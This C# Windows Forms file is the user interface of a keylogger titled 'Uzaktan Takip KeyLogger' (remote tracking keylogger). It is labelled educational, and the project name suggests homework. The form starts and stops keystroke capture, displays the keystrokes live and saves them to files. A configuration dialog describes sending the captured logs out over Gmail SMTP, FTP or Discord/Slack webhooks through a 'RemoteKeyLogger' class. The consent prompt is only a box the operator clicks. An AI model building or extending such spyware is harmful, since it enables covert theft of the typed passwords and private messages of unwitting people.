using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using DevExpress.XtraEditors;

namespace GameOdev
{
    public partial class Form1 : DevExpress.XtraEditors.XtraForm
    {
        private KeyLogger keyLogger;
        private bool isLogging = false;

        public Form1()
        {
            InitializeComponent();
            InitializeKeyLogger();
            SetupUI();
        }

        private void InitializeKeyLogger()
        {
            keyLogger = new KeyLogger();
            keyLogger.KeystrokeLogged += KeyLogger_KeystrokeLogged;
        }

        private void SetupUI()
        {
            // Set form properties
            this.Text = "🔍 Uzaktan Takip KeyLogger - Eğitim Amaçlı";
            this.Size = new Size(800, 600);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;

            // Add warning label
            Label warningLabel = new Label();
            warningLabel.Text = "⚠️ WARNING: This is for EDUCATIONAL purposes only!\nOnly use with explicit consent from the target user.";
            warningLabel.ForeColor = Color.Red;
            warningLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            warningLabel.Size = new Size(750, 60);
            warningLabel.Location = new Point(25, 20);
            warningLabel.TextAlign = ContentAlignment.TopCenter;
            this.Controls.Add(warningLabel);

            // Add start/stop button
            SimpleButton startStopButton = new SimpleButton();
            startStopButton.Text = "Start Logging";
            startStopButton.Size = new Size(120, 40);
            startStopButton.Location = new Point(50, 100);
            startStopButton.Click += StartStopButton_Click;
            this.Controls.Add(startStopButton);

            // Add clear button
            SimpleButton clearButton = new SimpleButton();
            clearButton.Text = "Clear Log";
            clearButton.Size = new Size(120, 40);
            clearButton.Location = new Point(180, 100);
            clearButton.Click += ClearButton_Click;
            this.Controls.Add(clearButton);

            // Add CONFIGURATION button - THIS IS THE MISSING BUTTON!
            SimpleButton configButton = new SimpleButton();
            configButton.Text = "⚙️ Konfigürasyon";
            configButton.Size = new Size(140, 40);
            configButton.Location = new Point(310, 100);
            configButton.Click += ConfigButton_Click;
            configButton.BackColor = Color.LightBlue;
            configButton.Font = new Font("Arial", 9, FontStyle.Bold);
            this.Controls.Add(configButton);

            // Add save button
            SimpleButton saveButton = new SimpleButton();
            saveButton.Text = "Save to File";
            saveButton.Size = new Size(120, 40);
            saveButton.Location = new Point(460, 100);
            saveButton.Click += SaveButton_Click;
            this.Controls.Add(saveButton);

            // Add status label
            Label statusLabel = new Label();
            statusLabel.Name = "statusLabel";
            statusLabel.Text = "Status: Stopped";
            statusLabel.Size = new Size(200, 30);
            statusLabel.Location = new Point(590, 110);
            statusLabel.ForeColor = Color.Blue;
            statusLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            this.Controls.Add(statusLabel);

            // Add keystroke display
            Label keystrokeLabel = new Label();
            keystrokeLabel.Text = "Keystrokes (Real-time):";
            keystrokeLabel.Size = new Size(200, 30);
            keystrokeLabel.Location = new Point(50, 160);
            keystrokeLabel.Font = new Font("Arial", 10, FontStyle.Bold);
            this.Controls.Add(keystrokeLabel);

            // Add text box for keystrokes
            TextEdit keystrokeTextBox = new TextEdit();
            keystrokeTextBox.Name = "keystrokeTextBox";
            keystrokeTextBox.Size = new Size(700, 350);
            keystrokeTextBox.Location = new Point(50, 190);
            keystrokeTextBox.Properties.ReadOnly = true;
            keystrokeTextBox.Properties.UseAdvancedMode = DevExpress.Utils.DefaultBoolean.True;
            keystrokeTextBox.Properties.Appearance.TextOptions.WordWrap = DevExpress.Utils.WordWrap.Wrap;
            keystrokeTextBox.Properties.Appearance.TextOptions.VAlignment = DevExpress.Utils.VertAlignment.Top;
            keystrokeTextBox.Properties.Appearance.TextOptions.Trimming = DevExpress.Utils.Trimming.None;
            this.Controls.Add(keystrokeTextBox);

            // Add info label
            Label infoLabel = new Label();
            infoLabel.Text = "Log file location: Desktop\\EducationalKeyLogger.txt";
            infoLabel.Size = new Size(400, 30);
            infoLabel.Location = new Point(50, 550);
            infoLabel.ForeColor = Color.Gray;
            infoLabel.Font = new Font("Arial", 8);
            this.Controls.Add(infoLabel);
        }

        private void StartStopButton_Click(object sender, EventArgs e)
        {
            if (!isLogging)
            {
                // Show consent dialog
                DialogResult result = MessageBox.Show(
                    "⚠️ EDUCATIONAL USE ONLY!\n\n" +
                    "This keylogger is for educational purposes only.\n" +
                    "Make sure you have explicit consent from the target user.\n\n" +
                    "Do you have proper consent to proceed?",
                    "Consent Confirmation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);

                if (result == DialogResult.Yes)
                {
                    keyLogger.StartLogging();
                    isLogging = true;
                    
                    SimpleButton button = sender as SimpleButton;
                    button.Text = "Stop Logging";
                    button.BackColor = Color.LightCoral;
                    
                    Label statusLabel = this.Controls["statusLabel"] as Label;
                    statusLabel.Text = "Status: Logging Active";
                    statusLabel.ForeColor = Color.Red;
                }
            }
            else
            {
                keyLogger.StopLogging();
                isLogging = false;
                
                SimpleButton button = sender as SimpleButton;
                button.Text = "Start Logging";
                button.BackColor = SystemColors.Control;
                
                Label statusLabel = this.Controls["statusLabel"] as Label;
                statusLabel.Text = "Status: Stopped";
                statusLabel.ForeColor = Color.Blue;
            }
        }

        private void ClearButton_Click(object sender, EventArgs e)
        {
            keyLogger.ClearBuffer();
            
            TextEdit keystrokeTextBox = this.Controls["keystrokeTextBox"] as TextEdit;
            keystrokeTextBox.Text = "";
        }

        private void SaveButton_Click(object sender, EventArgs e)
        {
            try
            {
                SaveFileDialog saveDialog = new SaveFileDialog();
                saveDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                saveDialog.FileName = $"KeystrokeLog_{DateTime.Now:yyyyMMdd_HHmmss}.txt";
                
                if (saveDialog.ShowDialog() == DialogResult.OK)
                {
                    string content = keyLogger.GetKeystrokes();
                    System.IO.File.WriteAllText(saveDialog.FileName, content);
                    MessageBox.Show($"Keystrokes saved to: {saveDialog.FileName}", "Save Successful", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ConfigButton_Click(object sender, EventArgs e)
        {
            try
            {
                MessageBox.Show(
                    "⚙️ KONFİGÜRASYON AYARLARI\n\n" +
                    "📧 E-posta Ayarları:\n" +
                    "   SMTP: smtp.gmail.com:587\n" +
                    "   Gmail App Password gerekli\n\n" +
                    "🌐 FTP Ayarları:\n" +
                    "   Sunucu: ftp.example.com:21\n" +
                    "   Kullanıcı/Şifre gerekli\n\n" +
                    "📱 Webhook Ayarları:\n" +
                    "   Discord/Slack webhook URL\n\n" +
                    "Detaylı ayarlar için:\n" +
                    "remote_config.json dosyasını düzenleyin\n\n" +
                    "Örnek konfigürasyon dosyası hazırlanmıştır!\n\n" +
                    "Uzaktan takip özelliklerini kullanmak için:\n" +
                    "RemoteKeyLogger sınıfını kullanın.",
                    "⚙️ Konfigürasyon Bilgisi",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Konfigürasyon hatası: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void KeyLogger_KeystrokeLogged(object sender, string keystroke)
        {
            // Update UI on main thread
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => UpdateKeystrokeDisplay(keystroke)));
            }
            else
            {
                UpdateKeystrokeDisplay(keystroke);
            }
        }

        private void UpdateKeystrokeDisplay(string keystroke)
        {
            TextEdit keystrokeTextBox = this.Controls["keystrokeTextBox"] as TextEdit;
            if (keystrokeTextBox != null)
            {
                keystrokeTextBox.Text += keystroke;
                
                // Auto-scroll to bottom
                keystrokeTextBox.SelectionStart = keystrokeTextBox.Text.Length;
                keystrokeTextBox.ScrollToCaret();
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (isLogging)
            {
                keyLogger.StopLogging();
            }
            keyLogger?.Dispose();
            base.OnFormClosing(e);
        }
    }
}
